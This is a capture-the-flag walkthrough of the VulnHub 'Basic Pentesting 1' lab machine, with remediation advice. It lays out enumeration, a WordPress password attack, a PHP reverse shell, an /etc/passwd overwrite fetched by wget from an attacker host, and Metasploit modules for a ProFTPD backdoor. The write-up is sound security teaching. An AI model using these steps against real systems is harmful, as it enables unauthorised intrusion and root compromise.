# VulnHub — Basic Pentesting 1

> A practical penetration-testing walkthrough covering reconnaissance, enumeration, multiple initial-access methods, privilege escalation, and root-level access.

---

## Table of Contents

* [Machine Information](#machine-information)
* [Methodology](#methodology)
* [1. Host Discovery](#1-host-discovery)
* [2. Port and Service Enumeration](#2-port-and-service-enumeration)
* [3. Web Enumeration](#3-web-enumeration)
* [4. WordPress Enumeration](#4-wordpress-enumeration)
* [Attack Path 1 — WordPress to Root](#attack-path-1--wordpress-to-root)

  * [5. WordPress Administrator Access](#5-wordpress-administrator-access)
  * [6. Initial Shell](#6-initial-shell)
  * [7. Privilege Escalation](#7-privilege-escalation)
  * [8. Root Access Verification](#8-root-access-verification)
* [Attack Path 2 — ProFTPD 1.3.3c](#attack-path-2--proftpd-133c)
* [Attack Path 3 — WordPress Metasploit Shell Upload](#attack-path-3--wordpress-metasploit-shell-upload)
* [Attack Path Comparison](#attack-path-comparison)
* [Vulnerabilities Identified](#vulnerabilities-identified)

  * [1. ProFTPD 1.3.3c Backdoor RCE](#1-proftpd-133c-backdoor-rce)
  * [2. Weak WordPress Credentials](#2-weak-wordpress-credentials)
  * [3. WordPress PHP Code Execution](#3-wordpress-php-code-execution)
  * [4. Writable `/etc/passwd`](#4-writable-etcpasswd)
* [Remediation Summary](#remediation-summary)
* [Tools Used](#tools-used)
* [Key Takeaways](#key-takeaways)
* [Conclusion](#conclusion)

---

## Machine Information

| Property    | Details                  |
| ----------- | ------------------------ |
| Machine     | Basic Pentesting 1       |
| Platform    | VulnHub                  |
| Target IP   | `192.168.0.200`          |
| Attacker OS | Kali Linux               |
| Environment | VirtualBox / Local CTF   |
| Objective   | Obtain root-level access |

> **Disclaimer:** This assessment was performed against an intentionally vulnerable CTF/lab machine in an authorized environment.

---

## Methodology

The assessment followed a basic penetration-testing process:

1. Host Discovery
2. Port Enumeration
3. Web Enumeration
4. WordPress Enumeration
5. Initial Access
6. Privilege Escalation
7. Root Verification
8. Alternative Attack Paths

---

# 1. Host Discovery

First, active hosts on the local network were identified.

```bash
sudo nmap -sn 192.168.0.0/24
```

The target was identified as:

```text
192.168.0.200
```

---

# 2. Port and Service Enumeration

A service/version scan was performed:

```bash
nmap -sV -sC -Pn 192.168.0.200
```

### Open Ports

| Port     | Service | Version        |
| -------- | ------- | -------------- |
| `21/tcp` | FTP     | ProFTPD 1.3.3c |
| `22/tcp` | SSH     | OpenSSH 7.2p2  |
| `80/tcp` | HTTP    | Apache 2.4.18  |

The two most interesting services were:

* **FTP:** ProFTPD 1.3.3c
* **HTTP:** Apache / WordPress

---

# 3. Web Enumeration

The initial website did not reveal useful information, so directory enumeration was performed.

```bash
dirb http://192.168.0.200
```

The scan discovered:

```text
/secret/
```

The `/secret/` directory contained a **WordPress installation**.

Further enumeration identified:

```text
/secret/wp-admin/
```

---

# 4. WordPress Enumeration

WPScan was used to enumerate WordPress users:

```bash
wpscan --url http://192.168.0.200/secret/ -e u
```

The `admin` user was discovered.

A password attack was then performed:

```bash
wpscan --url http://192.168.0.200/secret/ -U admin -P /usr/share/wordlists/dirb/common.txt
```

The credentials found were:

```text
Username: admin
Password: admin
```

This represents a **weak/default credential vulnerability**.

---

# Attack Path 1 — WordPress to Root

This was the primary attack path used to obtain complete system access.

## 5. WordPress Administrator Access

The discovered credentials provided access to the WordPress administrator panel.

The installed theme was:

```text
Twenty Seventeen
```

Because administrator access allowed modification of PHP theme files, it could be used to obtain server-side code execution.

---

## 6. Initial Shell

A PHP reverse shell was uploaded through the WordPress theme functionality.

The resulting shell ran as:

```text
www-data
```

The shell was stabilized using:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

The account was verified:

```bash
whoami
```

Output:

```text
www-data
```

The hostname was:

```bash
hostname
```

Output:

```text
vtcsec
```

At this stage, initial access had been obtained, but the privileges were still limited to `www-data`.

---

## 7. Privilege Escalation

Local enumeration revealed that `/etc/passwd` could be modified.

The relevant root entry was:

```text
root:x:0:0:root:/root:/bin/bash
```

Since UID `0` represents root, modifying the account information could be used for privilege escalation.

A password hash was generated using:

```bash
openssl passwd
```

The modified passwd file was transferred to the target using a temporary Python HTTP server:

```bash
python -m http.server 80
```

The target retrieved the file using:

```bash
wget http://192.168.0.115/passwords.txt
```

The modified `/etc/passwd` file was then used as documented during the assessment.

---

## 8. Root Access Verification

Root access was successfully obtained.

The shell showed:

```text
root@vtcsec:/tmp#
```

Verification:

```bash
whoami
```

Output:

```text
root
```

### Result

**Root-level access was successfully achieved.**

No flag file was present in the `/root` directory shown in the assessment evidence, so no flag is claimed in this write-up.

---

# Attack Path 2 — ProFTPD 1.3.3c

A second, independent route was identified through the FTP service.

The Nmap scan showed:

```text
21/tcp open ftp ProFTPD 1.3.3c
```

The version was researched using:

```bash
searchsploit ProFTPD 1.3.3c
```

A known ProFTPD 1.3.3c backdoor RCE was identified.

**Exploit-DB:**
https://www.exploit-db.com/exploits/15662

The Metasploit module used in the assessment was:

```text
modules/exploits/unix/ftp/proftpd_133c_backdoor.rb
```

The documented configuration included:

```text
RHOST = 192.168.0.200
LHOST = 192.168.0.15
```

Successful exploitation resulted in root-level access.

> **Note:** This is a direct root-compromise path, not a separate privilege-escalation step.

---

# Attack Path 3 — WordPress Metasploit Shell Upload

Another WordPress attack path was identified using Metasploit.

Module:

```text
exploit/unix/webapp/wp_admin_shell_upload
```

Configuration:

```text
RHOST      192.168.0.200
TARGETURI  /secret
USERNAME   admin
PASSWORD   admin
```

The module uses the existing WordPress administrator credentials to upload a shell and obtain command execution.

This is an **alternative initial-access method** and is separate from the manual WordPress theme technique used in Attack Path 1.

---

# Attack Path Comparison

| Attack Path                   | Initial Access | Privilege Escalation   | Result    |
| ----------------------------- | -------------- | ---------------------- | --------- |
| **WordPress → Reverse Shell** | `admin:admin`  | Writable `/etc/passwd` | **Root**  |
| **ProFTPD 1.3.3c**            | Backdoor RCE   | Not required           | **Root**  |
| **WordPress Metasploit**      | `admin:admin`  | Not documented         | **Shell** |

---

# Vulnerabilities Identified

## 1. ProFTPD 1.3.3c Backdoor RCE

**Severity:** Critical

The target was running a vulnerable ProFTPD 1.3.3c service that provided a direct route to root-level access.

**Recommendation:** Upgrade/remove the vulnerable version and disable FTP if it is unnecessary.

---

## 2. Weak WordPress Credentials

**Severity:** High

The WordPress administrator account used the weak credentials:

```text
admin:admin
```

**Recommendation:**

* Use strong passwords.
* Enable MFA.
* Remove default credentials.
* Apply account lockout/rate limiting.

---

## 3. WordPress PHP Code Execution

**Severity:** Critical

Administrator access allowed modification of executable PHP content, which enabled a reverse shell.

**Recommendation:**

* Restrict administrator privileges.
* Disable unnecessary theme/plugin editing.
* Keep WordPress and themes updated.
* Monitor PHP file modifications.

---

## 4. Writable `/etc/passwd`

**Severity:** Critical

The compromised `www-data` account was able to modify `/etc/passwd`, allowing privilege escalation to UID `0`.

**Recommendation:**

* Protect `/etc/passwd` from unprivileged modification.
* Verify correct ownership and permissions.
* Monitor changes to authentication files.
* Apply least privilege.

---

# Remediation Summary

| Area            | Recommendation                        |
| --------------- | ------------------------------------- |
| FTP             | Remove/upgrade vulnerable ProFTPD     |
| WordPress       | Use strong credentials and MFA        |
| WordPress Admin | Restrict PHP file modification        |
| Linux           | Protect `/etc/passwd`                 |
| Network         | Restrict unnecessary exposed services |
| System          | Keep software patched                 |

---

# Tools Used

| Tool         | Purpose                             |
| ------------ | ----------------------------------- |
| Nmap         | Host and service enumeration        |
| DIRB         | Web directory enumeration           |
| WPScan       | WordPress enumeration               |
| SearchSploit | Vulnerability research              |
| Metasploit   | Exploitation and shell access       |
| Python       | Shell stabilization / file transfer |
| OpenSSL      | Password hash generation            |
| Wget         | File retrieval                      |

---

# Key Takeaways

* Always perform thorough enumeration before exploitation.
* Service versions can reveal serious vulnerabilities.
* Hidden web directories can expose applications such as WordPress.
* Weak credentials can lead to administrative compromise.
* Initial access does not necessarily mean root access.
* Local enumeration is essential after obtaining a low-privileged shell.
* File permissions can create critical privilege-escalation opportunities.
* Multiple independent attack paths may exist on the same target.

---

# Conclusion

The Basic Pentesting 1 machine demonstrated several common penetration-testing weaknesses.

The primary attack path used a vulnerable WordPress installation to obtain a `www-data` shell, followed by privilege escalation through the writable `/etc/passwd` file.

Two additional attack paths were identified:

* **ProFTPD 1.3.3c → Direct Root Access**
* **WordPress Administrator → Metasploit Shell Upload → Shell Access**

The assessment successfully demonstrated **root-level compromise** of the target machine.

> **Final Result: Root Access Achieved**
